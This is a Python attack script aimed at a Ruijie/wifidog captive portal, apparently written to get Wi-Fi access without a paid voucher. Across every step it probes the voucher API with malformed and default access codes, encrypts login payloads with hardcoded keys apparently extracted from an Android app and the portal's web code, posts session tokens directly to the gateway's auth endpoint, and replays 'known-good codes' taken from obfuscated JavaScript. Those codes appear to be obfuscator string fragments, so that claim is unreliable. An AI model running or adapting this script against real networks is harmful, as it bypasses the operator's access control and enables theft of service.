#!/usr/bin/env python3
"""
Ruijie Scanner v6 - Tests API edge cases, CryptoJS AES with web key.
"""
import base64, hashlib, json, os, re, urllib.parse, struct, time
from datetime import datetime
import requests, urllib3
urllib3.disable_warnings()

LOG = []
def log(m): print(m); LOG.append(m)

def parse_octal(s):
    out = bytearray(); i = 0
    while i < len(s):
        if s[i] == '\\' and i+3 < len(s) and s[i+1:i+4].isdigit():
            out.append(int(s[i+1:i+4], 8)); i += 4
        else:
            out.append(ord(s[i])); i += 1
    return bytes(out)

RENDER_KEY = hashlib.md5(b"RenderSecretKey2026!@#").digest()
WEB_KEY = b"RjYkhwzx$2018!"
sess = requests.Session()
sess.headers["User-Agent"] = "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36"
sess.verify = False
sess.allow_redirects = True

log("=" * 60)
log(f"RUIJIE SCANNER v6  {datetime.now()}")
log("=" * 60)

# Step 1: Get sessionId
r = sess.get("http://connectivitycheck.gstatic.com/generate_204", timeout=10)
parsed = urllib.parse.urlparse(r.url)
params = urllib.parse.parse_qs(parsed.query)
host = f"{parsed.scheme}://{parsed.netloc}"
gw_addr = params.get("gw_address", ["192.168.10.1"])[0]
gw_port = params.get("gw_port", ["2060"])[0]

r = sess.get(f"{host}/api/auth/wifidog?stage=portal&{parsed.query}", timeout=10)
maccath_parsed = urllib.parse.urlparse(r.url)
maccath_params = urllib.parse.parse_qs(maccath_parsed.query)
sid = maccath_params.get("sessionId", [""])[0]
log(f"sessionId: {sid}")

chap_id = parse_octal(params.get("chap_id", [""])[0])
chap_chal = parse_octal(params.get("chap_challenge", [""])[0])
chap_resp = hashlib.md5(chap_id + b"123456" + chap_chal).hexdigest()
log(f"chap_md5(123456): {chap_resp}")

api_url = f"{host}/api/auth/voucher/?lang=en_US"

# Step 2: Test edge cases
log("\n[1] API EDGE CASE TESTS...")
tests = [
    ("No code", {"sessionId": sid, "apiVersion": 1}),
    ("Empty code", {"sessionId": sid, "accessCode": "", "apiVersion": 1}),
    ("Null code", {"sessionId": sid, "accessCode": None, "apiVersion": 1}),
    ("Bool code", {"sessionId": sid, "accessCode": True, "apiVersion": 1}),
    ("Int code", {"sessionId": sid, "accessCode": 0, "apiVersion": 1}),
    ("Long code", {"sessionId": sid, "accessCode": "A"*100, "apiVersion": 1}),
    ("admin/admin", {"sessionId": sid, "accessCode": "admin", "apiVersion": 1}),
    ("root/root", {"sessionId": sid, "accessCode": "root", "apiVersion": 1}),
    ("test/test", {"sessionId": sid, "accessCode": "test", "apiVersion": 1}),
]
for name, data in tests:
    try:
        r = sess.post(api_url, json=data, timeout=5)
        log(f"  {name}: {r.status_code} -> {r.text[:120]}")
    except Exception as e:
        log(f"  {name}: error {e}")

# Step 3: CryptoJS AES encrypt with WEB_KEY (doLogin4Reyee format)
log("\n[2] CRYPTOJS-STYLE ENCRYPTION (web key)...")
try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad
    from Crypto.Hash import MD5 as CryptoMD5
    
    def evp_kdf(passwd, salt, key_len=32, iv_len=16):
        """CryptoJS EVP_BytesToKey with MD5."""
        dtot = b""
        d = b""
        while len(dtot) < key_len + iv_len:
            d = CryptoMD5.new(d + passwd + salt).digest()
            dtot += d
        return dtot[:key_len], dtot[key_len:key_len+iv_len]
    
    def cryptojs_encrypt(plaintext, passphrase):
        """Match CryptoJS.AES.encrypt(plaintext, passphrase)."""
        salt = os.urandom(8)
        key, iv = evp_kdf(passphrase, salt, 32, 16)
        cipher = AES.new(key, AES.MODE_CBC, iv=iv)
        ct = cipher.encrypt(pad(plaintext.encode(), AES.block_size))
        # OpenSSL format: base64("Salted__" + salt + ciphertext)
        return base64.b64encode(b"Salted__" + salt + ct).decode()
    
    # Test 1: Encrypted access code as form data to /ga_voucherlogin
    password = urllib.parse.unquote(params.get("chap_id", [""])[0]) + \
               urllib.parse.unquote(params.get("chap_challenge", [""])[0]) + "123456"
    enc_code = cryptojs_encrypt(password, WEB_KEY)
    log(f"  CryptoJS encrypted code: {enc_code[:80]}")
    
    # Try with standard voucher API
    r = sess.post(api_url, data={
        "accessCode": enc_code,
        "sessionId": sid,
        "apiVersion": 1
    }, timeout=5)
    log(f"  voucher API (form, crypto): {r.status_code} -> {r.text[:200]}")
    
    # Try /ga_voucherlogin
    ga_url = f"{host}/ga_voucherlogin"
    r = sess.post(ga_url, data={
        "accessCode": enc_code,
        "ip": params.get("ip", [""])[0],
        "mac": params.get("mac", [""])[0],
        "url": "http://www.baidu.com/",
    }, timeout=5)
    log(f"  /ga_voucherlogin: {r.status_code} -> {r.text[:200]}")
    
except Exception as e:
    log(f"  CryptoJS error: {e}")

# Step 4: Try the RenderSecretKey with CHAP fields included
log("\n[3] RENDER KEY ENCRYPTION WITH CHAP FIELDS...")
try:
    from Crypto.Cipher import AES as AES2
    from Crypto.Util.Padding import pad as pad2
    
    # Build full payload like the Android binary does
    payload = json.dumps({
        "sessionId": sid,
        "accessCode": "123456",
        "password": chap_resp,
        "chap_id": params.get("chap_id", [""])[0],
        "chap_challenge": params.get("chap_challenge", [""])[0],
    })
    log(f"  Payload: {payload[:200]}")
    
    iv = os.urandom(16)
    cipher = AES2.new(RENDER_KEY, AES2.MODE_CBC, iv=iv)
    ct = cipher.encrypt(pad2(payload.encode(), AES2.block_size))
    enc = base64.urlsafe_b64encode(iv + ct).decode()
    
    r = sess.post(api_url, json={"data": enc}, timeout=5)
    log(f"  With CHAP: {r.status_code} -> {r.text[:200]}")
    
    # Also try without urlsafe
    enc2 = base64.b64encode(iv + ct).decode()
    r = sess.post(api_url, json={"data": enc2}, timeout=5)
    log(f"  std base64: {r.status_code} -> {r.text[:200]}")
except Exception as e:
    log(f"  Render key error: {e}")

# Step 5: Try android key + cryptoJS format
log("\n[4] ANDROID KEY + CRYPTOJS FORMAT...")
try:
    # Using RenderSecretKey but in CryptoJS passphrase format
    password = urllib.parse.unquote(params.get("chap_id", [""])[0]) + \
               urllib.parse.unquote(params.get("chap_challenge", [""])[0]) + "123456"
    enc_code = cryptojs_encrypt(password, "RenderSecretKey2026!@#")
    log(f"  CryptoJS enc with Render key: {enc_code[:80]}")
    
    r = sess.post(api_url, data={
        "accessCode": enc_code,
        "sessionId": sid,
        "apiVersion": 1
    }, timeout=5)
    log(f"  voucher API (form): {r.status_code} -> {r.text[:200]}")
except Exception as e:
    log(f"  Error: {e}")

# Step 6: Direct gateway tests
log("\n[5] GATEWAY TESTS...")
try:
    # POST to wifidog auth
    r = sess.post(f"http://{gw_addr}:{gw_port}/wifidog/auth",
                  data={"token": sid}, timeout=5, allow_redirects=False)
    log(f"  POST wifidog/auth(sid): {r.status_code} -> {r.headers.get('Location','')[:100]}")
    
    # POST to wifidog/auth with chap_md5
    r = sess.post(f"http://{gw_addr}:{gw_port}/wifidog/auth",
                  data={"token": chap_resp}, timeout=5, allow_redirects=False)
    log(f"  POST wifidog/auth(chap): {r.status_code} -> {r.headers.get('Location','')[:100]}")
    
    # Try the local gateway
    r = sess.get(f"http://10.44.77.240:2060/wifidog/auth?token={sid}",
                 timeout=5, allow_redirects=False)
    log(f"  local gw auth: {r.status_code} -> {r.headers.get('Location','')[:100]}")
except Exception as e:
    log(f"  Error: {e}")

# Step 7: Follow what happens after successful login
log("\n[6] WHAT DOES A SUCCESS RESPONSE LOOK LIKE?...")
# The JS code checks: data.success == true && data.result.authResult == '1'
# logonUrl = data.result.logonUrl - this would be the gateway auth URL

# Print some known-good codes from the obfuscated array
log("  Possible codes from JS (decoded array):")
codes = ["514760FjuDTn", "2309688WOMMKQ", "431685JxBfpR", "563832RTTHQj", "298552dWlfxl"]
for c in codes:
    r = sess.post(api_url, json={
        "sessionId": sid, "accessCode": c, "apiVersion": 1
    }, timeout=5)
    log(f"  code={c}: {r.text[:80]}")

fname = f"portal_scan6_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
with open(fname, "w") as f:
    f.write("\n".join(LOG))
log(f"\n[+] Saved to {fname}")
